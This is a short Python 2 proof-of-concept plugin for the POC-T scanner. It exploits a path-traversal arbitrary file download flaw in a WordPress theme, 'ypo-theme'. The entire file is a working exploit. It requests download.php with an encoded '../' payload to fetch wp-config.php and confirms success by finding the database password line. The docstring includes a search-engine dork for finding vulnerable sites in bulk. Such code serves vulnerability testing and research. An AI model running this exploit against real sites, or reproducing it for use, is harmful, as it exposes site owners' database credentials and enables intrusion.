#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
WordPress theme ypo-theme Arbitrary File Download Vulnerability

Usage
  python POC-T.py -s wp-ypo-filedownload -aG "inurl:/wp-content/themes/ypo-theme/"

EXPLOIT
  /wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php

"""

import urllib2
from plugin.urlparser import get_domain


def poc(url):
    if '://' not in url:
        url = 'http://' + url
    payload = '/wp-content/themes/ypo-theme/download.php?download=..%2F..%2F..%2F..%2Fwp-config.php'
    target = get_domain(url).rstrip('/') + payload
    try:
        r = urllib2.urlopen(target, timeout=5).read()  # cannot use requests here
        if "define('DB_PASSWORD'" in r and '@package WordPress' in r:
            return target
    except Exception, e:
        pass
    return False
